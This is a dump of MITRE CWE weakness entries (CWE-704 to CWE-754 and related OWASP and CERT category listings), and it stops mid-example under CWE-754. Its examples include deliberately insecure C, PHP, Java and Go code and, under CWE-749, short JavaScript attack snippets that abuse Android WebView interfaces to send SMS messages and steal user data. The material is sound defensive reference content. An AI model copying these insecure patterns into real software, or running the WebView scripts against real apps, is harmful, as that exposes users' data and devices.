CWE-704: Incorrect Type Conversion or Cast,"The product does not correctly convert an object, resource, or structure from one type to a different type.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number.(bad code)Example Language:Cunsigned int readdata () {int amount = 0;...amount = accessmainframe();...return amount;}If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers.Example 2The following code uses a union to support the representation of different types of messages. It formats messages differently, depending on their type.(bad code)Example Language:C#define NAME_TYPE 1#define ID_TYPE 2struct MessageBuffer{int msgType;union {char *name;int nameID;};};int main (int argc, char **argv) {struct MessageBuffer buf;char *defaultMessage = ""Hello World"";buf.msgType = NAME_TYPE;buf.name = defaultMessage;printf(""Pointer of buf.name is %p\n"", buf.name);/* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */buf.nameID = (int)(defaultMessage + 1);printf(""Pointer of buf.name is now %p\n"", buf.name);if (buf.msgType == NAME_TYPE) {printf(""Message: %s\n"", buf.name);}else {printf(""Message: Use ID %d\n"", buf.nameID);}}The code intends to process the message as a NAME_TYPE, and sets the default message to ""Hello World."" However, since both buf.name and buf.nameID are part of the same union, they can act as aliases for the same memory location, depending on memory layout after compilation.As a result, modification of buf.nameID - an int - can effectively modify the pointer that is stored in buf.name - a string.Execution of the program might generate output such as:Pointer of name is 10830Pointer of name is now 10831Message: ello WorldNotice how the pointer for buf.name was changed, even though buf.name was not explicitly modified.In this case, the first ""H"" character of the message is omitted. However, if an attacker is able to fully control the value of buf.nameID, then buf.name could contain an arbitrary pointer, leading to out-of-bounds reads or writes.",无可能的缓解方案
CWE-705: Incorrect Control Flow Scoping,The product does not properly return control flow to the proper location after it has completed a task or detected an unusual condition.,"Scope: Other, Impact: Technical Impact:Alter Execution Logic; Other, Likelihood: ","Example 1The following example attempts to resolve a hostname.(bad code)Example Language:Javaprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {String ip = req.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);...out.println(""hello "" + addr.getHostName());}A DNS lookup failure will cause the Servlet to throw an exception.Example 2This code queries a server and displays its status when a request comes from an authorized IP address.(bad code)Example Language:PHP$requestingIP = $_SERVER['REMOTE_ADDR'];if(!in_array($requestingIP,$ipAllowList)){echo ""You are not authorized to view this page"";http_redirect($errorPageURL);}$status = getServerStatus();echo $status;...This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack (CWE-212).Example 3Included in the doPost() method defined below is a call to System.exit() in the event of a specific exception.(bad code)Example Language:JavaPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {try {...} catch (ApplicationSpecificException ase) {logger.error(""Caught: "" + ase.toString());System.exit(1);}}",无可能的缓解方案
CWE-706: Use of Incorrectly-Resolved Name or Reference,"The product uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-707: Improper Neutralization,The product does not ensure or incorrectly ensures that structured messages or data are well-formed and that certain security properties are met before being read from an upstream component or sent to a downstream component.,"Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,无可能的缓解方案
CWE-708: Incorrect Ownership Assignment,"The product assigns an owner to a resource, but the owner is outside of the intended control sphere.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application DataAn attacker could read and modify data for which they do not have permissions to access directly., Likelihood: ",无示范例子,Phase:  PolicyPeriodically review the privileges and their owners.Phase:  TestingUse automated tools to check for privilege settings.
CWE VIEW: Named Chains,This view displays Named Chains and their components.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-710: Improper Adherence to Coding Standards,"The product does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,"Phase:  ImplementationDocument and closely follow coding standards.Phases:  Testing; ImplementationWhere possible, use automated tools to enforce the standards."
CWE VIEW: Weaknesses in OWASP Top Ten (2004),"CWE entries in this view (graph) are associated with the OWASP Top Ten, as released in 2004, and as required for compliance with PCI DSS version 1.1. This view is considered obsolete as a newer version of the OWASP Top Ten is available.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A1 - Cross Site Scripting (XSS),Weaknesses in this category are related to the A1 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A2 - Injection Flaws,Weaknesses in this category are related to the A2 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A3 - Malicious File Execution,Weaknesses in this category are related to the A3 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A4 - Insecure Direct Object Reference,Weaknesses in this category are related to the A4 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A5 - Cross Site Request Forgery (CSRF),Weaknesses in this category are related to the A5 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A6 - Information Leakage and Improper Error Handling,Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A7 - Broken Authentication and Session Management,Weaknesses in this category are related to the A7 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A8 - Insecure Cryptographic Storage,Weaknesses in this category are related to the A8 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A9 - Insecure Communications,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2007 Category A10 - Failure to Restrict URL Access,Weaknesses in this category are related to the A10 category in the OWASP Top Ten 2007.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A1 - Unvalidated Input,Weaknesses in this category are related to the A1 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A2 - Broken Access Control,Weaknesses in this category are related to the A2 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A3 - Broken Authentication and Session Management,Weaknesses in this category are related to the A3 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A4 - Cross-Site Scripting (XSS) Flaws,Weaknesses in this category are related to the A4 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A5 - Buffer Overflows,Weaknesses in this category are related to the A5 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A6 - Injection Flaws,Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A7 - Improper Error Handling,Weaknesses in this category are related to the A7 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A8 - Insecure Storage,Weaknesses in this category are related to the A8 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A9 - Denial of Service,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2004 Category A10 - Insecure Configuration Management,Weaknesses in this category are related to the A10 category in the OWASP Top Ten 2004.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-732: Incorrect Permission Assignment for Critical Resource,The product specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or DirectoriesAn attacker may be able to read sensitive information from the associated resource, such as credentials or configuration information stored in a file., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker may be able to modify critical properties of the associated resource to gain privileges, such as replacing a world-writable executable with a Trojan horse., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; OtherAn attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database., Likelihood: ","Example 1The following code sets the umask of the process to 0 before creating a file and writing ""Hello world"" into the file.(bad code)Example Language:C#define OUTFILE ""hello.out""umask(0);FILE *out;/* Ignore link following (CWE-59) for brevity */out = fopen(OUTFILE, ""w"");if (out) {fprintf(out, ""hello world!\n"");fclose(out);}After running this program on a UNIX system, running the ""ls -l"" command might return the following output:(result)-rw-rw-rw- 1 username 13 Nov 24 17:58 hello.outThe ""rw-rw-rw-"" string indicates that the owner, group, and world (all users) can read the file and write to it.Example 2This code creates a home directory for a new user, and makes that user the owner of the directory. If the new directory cannot be owned by the user, the directory is deleted.(bad code)Example Language:PHPfunction createUserDir($username){$path = '/home/'.$username;if(!mkdir($path)){return false;}if(!chown($path,$username)){rmdir($path);return false;}return true;}Because the optional ""mode"" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new user as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any user to read and write to the directory, allowing an attack on the user's files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups.This code may also be vulnerable to Path Traversal (CWE-22) attacks if an attacker supplies a non alphanumeric username.Example 3The following code snippet might be used as a monitor to periodically record whether a web site is alive. To ensure that the file can always be modified, the code uses chmod() to make the file world-writable.(bad code)Example Language:Perl$fileName = ""secretFile.out"";if (-e $fileName) {chmod 0777, $fileName;}my $outFH;if (! open($outFH, "">>$fileName"")) {ExitError(""Couldn't append to $fileName: $!"");}my $dateString = FormatCurrentTime();my $status = IsHostAlive(""cwe.mitre.org"");print $outFH ""$dateString cwe status: $status!\n"";close($outFH);The first time the program runs, it might create a new file that inherits the permissions from its environment. A file listing might look like:(result)-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.outThis listing might occur when the user has a default umask of 022, which is a common setting. Depending on the nature of the file, the user might not have intended to make it readable by everyone on the system.The next time the program runs, however - and all subsequent executions - the chmod will set the file's permissions so that the owner, group, and world (all users) can read the file and write to it:(result)-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.outPerhaps the programmer tried to do this because a different process uses different permissions that might prevent the file from being updated.Example 4This program creates and reads from an admin file to determine privilege information.If the admin file doesn't exist, the program will create one. In order to create the file, the program must have write privileges to write to the file. After the file is created, the permissions need to be changed to read only.(bad code)Example Language:Goconst adminFile = ""/etc/admin-users""func createAdminFileIfNotExists() error {file, err := os.Create(adminFile)if err != nil {return err}return nil}func changeModeOfAdminFile() error {fileMode := os.FileMode(0440)if err := os.Chmod(adminFile, fileMode); err != nil {return err}return nil}os.Create will create a file with 0666 permissions before umask if the specified file does not exist. A typical umask of 0022 would result in the file having 0644 permissions. That is, the file would have world-writable and world-readable permissions.In this scenario, it is advised to use the more customizable method of os.OpenFile with the os.O_WRONLY and os.O_CREATE flags specifying 0640 permissions to create the admin file.This is because on a typical system where the umask is 0022, the perm 0640 applied in os.OpenFile will result in a file of 0620 where only the owner and group can write.Example 5The following command recursively sets world-readable permissions for a directory and all of its children:(bad code)Example Language:Shellchmod -R ugo+r DIRNAMEIf this command is run from a program, the person calling the program might not expect that all the files under the directory will be world-readable. If the directory is expected to contain private data, this could become a security problem.Example 6The following Azure command updates the settings for a storage account:(bad code)Example Language:Shellaz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access trueHowever, ""Allow Blob Public Access"" is set to true, meaning that anonymous/public users can access blobs.The command could be modified to disable ""Allow Blob Public Access"" by setting it to false.(good code)Example Language:Shellaz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access falseExample 7The following Google Cloud Storage command gets the settings for a storage account named 'BUCKET_NAME':(informative)Example Language:Shellgsutil iam get gs://BUCKET_NAMESuppose the command returns the following result:(bad code)Example Language:JSON{""bindings"":[{""members"":[""projectEditor: PROJECT-ID"",""projectOwner: PROJECT-ID""],""role"":""roles/storage.legacyBucketOwner""},{""members"":[""allUsers"",""projectViewer: PROJECT-ID""],""role"":""roles/storage.legacyBucketReader""}]}This result includes the ""allUsers"" or IAM role added as members, causing this policy configuration to allow public access to cloud storage resources. There would be a similar concern if ""allAuthenticatedUsers"" was present.The command could be modified to remove ""allUsers"" and/or ""allAuthenticatedUsers"" as follows:(good code)Example Language:Shellgsutil iam ch -d allUsers gs://BUCKET_NAMEgsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME","Phase:  ImplementationWhen using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user) [REF-62], and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party.Phase:  Architecture and DesignDivide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources. [REF-207]Effectiveness: ModerateNote:This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.Phases:  Implementation; InstallationDuring program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.Effectiveness: HighPhase:  System ConfigurationFor all configuration files, executables, and libraries, make sure that they are only readable and writable by the software's administrator.Effectiveness: HighPhase:  DocumentationDo not suggest insecure configuration changes in documentation, especially if those configurations can extend to resources and other programs that are outside the scope of the application.Phase:  InstallationDo not assume that a system administrator will manually change the configuration to the settings that are recommended in the software's manual.Phases:  Operation; System ConfigurationStrategy:  Environment HardeningEnsure that the software runs properly under the United States Government Configuration Baseline (USGCB) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software.Phases:  Implementation; System Configuration; OperationWhen storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access."
CWE-733: Compiler Optimization Removal or Modification of Security-critical Code,"The developer builds a security-critical protection mechanism into the software, but the compiler optimizes the program such that the mechanism is removed or modified.","Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; Other, Likelihood: ","Example 1The following code reads a password from the user, uses the password to connect to a back-end mainframe and then attempts to scrub the password from memory using memset().(bad code)Example Language:Cvoid GetData(char *MFAddr) {char pwd[64];if (GetPasswordFromUser(pwd, sizeof(pwd))) {if (ConnectToMainframe(MFAddr, pwd)) {// Interaction with mainframe}}memset(pwd, 0, sizeof(pwd));}The code in the example will behave correctly if it is executed verbatim, but if the code is compiled using an optimizing compiler, such as Microsoft Visual C++ .NET or GCC 3.x, then the call to memset() will be removed as a dead store because the buffer pwd is not used after its value is overwritten [18]. Because the buffer pwd contains a sensitive value, the application may be vulnerable to attack if the data are left memory resident. If attackers are able to access the correct region of memory, they may use the recovered password to gain control of the system.It is common practice to overwrite sensitive data manipulated in memory, such as passwords or cryptographic keys, in order to prevent attackers from learning system secrets. However, with the advent of optimizing compilers, programs do not always behave as their source code alone would suggest. In the example, the compiler interprets the call to memset() as dead code because the memory being written to is not subsequently used, despite the fact that there is clearly a security motivation for the operation to occur. The problem here is that many compilers, and in fact many programming languages, do not take this and other security concerns into consideration in their efforts to improve efficiency.Attackers typically exploit this type of vulnerability by using a core dump or runtime mechanism to access the memory used by a particular application and recover the secret information. Once an attacker has access to the secret information, it is relatively straightforward to further exploit the system and possibly compromise other resources with which the application interacts.",无可能的缓解方案
CWE VIEW: Weaknesses Addressed by the CERT C Secure Coding Standard (2008),"CWE entries in this view (graph) are fully or partially eliminated by following the guidance presented in the book ""The CERT C Secure Coding Standard"" published in 2008. This view is considered obsolete, as a newer version of the coding standard is available. This view statically represents the coding rules as they were in 2008.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 2 - Preprocessor (PRE),Weaknesses in this category are related to the rules and recommendations in the Preprocessor (PRE) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 3 - Declarations and Initialization (DCL),Weaknesses in this category are related to the rules and recommendations in the Declarations and Initialization (DCL) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 4 - Expressions (EXP),Weaknesses in this category are related to the rules and recommendations in the Expressions (EXP) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 5 - Integers (INT),Weaknesses in this category are related to the rules and recommendations in the Integers (INT) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 6 - Floating Point (FLP),Weaknesses in this category are related to the rules and recommendations in the Floating Point (FLP) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 7 - Arrays (ARR),Weaknesses in this category are related to the rules and recommendations in the Arrays (ARR) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 8 - Characters and Strings (STR),Weaknesses in this category are related to the rules and recommendations in the Characters and Strings (STR) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 9 - Memory Management (MEM),Weaknesses in this category are related to the rules and recommendations in the Memory Management (MEM) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 10 - Input Output (FIO),Weaknesses in this category are related to the rules and recommendations in the Input Output (FIO) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 11 - Environment (ENV),Weaknesses in this category are related to the rules and recommendations in the Environment (ENV) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 12 - Signals (SIG),Weaknesses in this category are related to the rules and recommendations in the Signals (SIG) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 13 - Error Handling (ERR),Weaknesses in this category are related to the rules and recommendations in the Error Handling (ERR) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Chapter 14 - Miscellaneous (MSC),Weaknesses in this category are related to the rules and recommendations in the Miscellaneous (MSC) chapter of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CERT C Secure Coding Standard (2008) Appendix - POSIX (POS),Weaknesses in this category are related to the rules and recommendations in the POSIX (POS) appendix of the CERT C Secure Coding Standard (2008).,无常见后果信息,无示范例子,无可能的缓解方案
CWE-749: Exposed Dangerous Method or Function,"The product provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.","Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Gain Privileges or Assume Identity; Read Application Data; Modify Application Data; Execute Unauthorized Code or Commands; OtherExposing critical functionality essentially provides an attacker with the privilege level of the exposed functionality. This could result in the modification or exposure of sensitive data or possibly even execution of arbitrary code., Likelihood: ","Example 1In the following Java example the method removeDatabase will delete the database with the name specified in the input parameter.(bad code)Example Language:Javapublic void removeDatabase(String databaseName) {try {Statement stmt = conn.createStatement();stmt.execute(""DROP DATABASE "" + databaseName);} catch (SQLException ex) {...}}The method in this example is declared public and therefore is exposed to any class in the application. Deleting a database should be considered a critical operation within an application and access to this potentially dangerous method should be restricted. Within Java this can be accomplished simply by declaring the method private thereby exposing it only to the enclosing class as in the following example.(good code)Example Language:Javaprivate void removeDatabase(String databaseName) {try {Statement stmt = conn.createStatement();stmt.execute(""DROP DATABASE "" + databaseName);} catch (SQLException ex) {...}}Example 2These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:(bad code)Example Language:Java// Android@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){writeDataToView(view, UserData);return false;}else{return true;}}}(bad code)Example Language:Objective-C// iOS-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType{NSURL *URL = [exRequest URL];if ([[URL scheme] isEqualToString:@""exampleScheme""]){NSString *functionString = [URL resourceSpecifier];if ([functionString hasPrefix:@""specialFunction""]){// Make data available back in webview.UIWebView *webView = [self writeDataToView:[URL query]];}return NO;}return YES;}A call into native code can then be initiated by passing parameters within the URL:(attack code)Example Language:JavaScriptwindow.location = examplescheme://method?parameter=valueBecause the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.Example 3This application uses a WebView to display websites, and creates a Javascript interface to a Java object to allow enhanced functionality on a trusted website:(bad code)Example Language:Javapublic class WebViewGUI extends Activity {WebView mainWebView;public void onCreate(Bundle savedInstanceState) {super.onCreate(savedInstanceState);mainWebView = new WebView(this);mainWebView.getSettings().setJavaScriptEnabled(true);mainWebView.addJavascriptInterface(new JavaScriptInterface(), ""userInfoObject"");mainWebView.loadUrl(""file:///android_asset/www/index.html"");setContentView(mainWebView);}final class JavaScriptInterface {JavaScriptInterface () {}public String getUserInfo() {return currentUser.Info();}}}Before Android 4.2 all methods, including inherited ones, are exposed to Javascript when using addJavascriptInterface(). This means that a malicious website loaded within this WebView can use reflection to acquire a reference to arbitrary Java objects. This will allow the website code to perform any action the parent application is authorized to.For example, if the application has permission to send text messages:(attack code)Example Language:JavaScript<script>userInfoObject.getClass().forName('android.telephony.SmsManager').getMethod('getDefault',null).sendTextMessage(attackNumber, null, attackMessage, null, null);</script>This malicious script can use the userInfoObject object to load the SmsManager object and send arbitrary text messages to any recipient.Example 4After Android 4.2, only methods annotated with @JavascriptInterface are available in JavaScript, protecting usage of getClass() by default, as in this example:(bad code)Example Language:Javafinal class JavaScriptInterface {JavaScriptInterface () { }@JavascriptInterfacepublic String getUserInfo() {return currentUser.Info();}}This code is not vulnerable to the above attack, but still may expose user info to malicious pages loaded in the WebView. Even malicious iframes loaded within a trusted page may access the exposed interface:(attack code)Example Language:JavaScript<script>var info = window.userInfoObject.getUserInfo();sendUserInfo(info);</script>This malicious code within an iframe is able to access the interface object and steal the user's data.","Phase:  Architecture and DesignIf you must expose a method, make sure to perform input validation on all arguments, limit access to authorized parties, and protect against all possible vulnerabilities.Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionIdentify all exposed functionality. Explicitly list all functionality that must be exposed to some user or set of users. Identify which functionality may be:accessible to all usersrestricted to a small set of privileged usersprevented from being directly accessible at allEnsure that the implemented code follows these expectations. This includes setting the appropriate access modifiers where applicable (public, private, protected, etc.) or not marking ActiveX controls safe-for-scripting."
CWE VIEW: Weaknesses in the 2009 CWE/SANS Top 25 Most Dangerous Programming Errors,CWE entries in this view (graph) are listed in the 2009 CWE/SANS Top 25 Programming Errors. This view is considered obsolete as a newer version of the Top 25 is available.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2009 Top 25 - Insecure Interaction Between Components,"Weaknesses in this category are listed in the ""Insecure Interaction Between Components"" section of the 2009 CWE/SANS Top 25 Programming Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2009 Top 25 - Risky Resource Management,"Weaknesses in this category are listed in the ""Risky Resource Management"" section of the 2009 CWE/SANS Top 25 Programming Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2009 Top 25 - Porous Defenses,"Weaknesses in this category are listed in the ""Porous Defenses"" section of the 2009 CWE/SANS Top 25 Programming Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-754: Improper Check for Unusual or Exceptional Conditions,The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product.,"Scope: IntegrityAvailability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Unexpected StateThe data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors., Likelihood: ","Example 1Consider the following code segment:(bad code)Example Language:Cchar buf[10], cp_buf[10];fgets(buf, 10, stdin);strcpy(cp_buf, buf);The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy().Example 2The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc().(bad code)Example Language:Cbuf = (char*) malloc(req_size);strncpy(buf, xfer, req_size);The traditional defense of this coding error is: ""If my program runs out of memory, it will fail. It doesn't matter whether I handle the error or simply allow the program to die with a segmentation fault when it tries to dereference the null pointer."" This argument ignores three important considerations:Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue.It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state.The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know.Example 3The following examples read a file into a byte array.(bad code)Example Language:C#char[] byteArray = new char[1024];for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {String userName = (String) i.Current();String pFileName = PFILE_ROOT + ""/"" + userName;StreamReader sr = new StreamReader(pFileName);sr.Read(byteArray,0,1024);//the file is always 1k bytessr.Close();processPFile(userName, byteArray);}(bad code)Example Language:JavaFileInputStream fis;byte[] byteArray = new byte[1024];for (Iterator i=users.iterator(); i.hasNext();) {String userName = (String) i.next();String pFileName = PFILE_ROOT + ""/"" + userName;FileInputStream fis = new FileInputStream(pFileName);fis.read(byteArray); // the file is always 1k bytesfis.close();processPFile(userName, byteArray);The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker.Example 4The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference.(bad code)Example Language:JavaString itemName = request.getParameter(ITEM_NAME);if (itemName.compareTo(IMPORTANT_ITEM) == 0) {...}...The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference.(bad code)Example Language:JavaString itemName = request.Item(ITEM_NAME);if (itemName.Equals(IMPORTANT_ITEM)) {...}...The traditional defense of this coding error is: ""I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.Example 5The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined.(bad code)Example Language:JavaSystem.clearProperty(""os.name"");...String os = System.getProperty(""os.name"");if (os.equalsIgnoreCase(""Windows 95"")) System.out.println(""Not supported"");The traditional defense of this coding error is: ""I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.Example 6The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value.(bad code)Example Language:C#Dim MyFile As New FileStream(""myfile.txt"", FileMode.Open, FileAccess.Read, FileShare.Read)Dim MyArray(50) As ByteMyFile.Read(MyArray, 0, 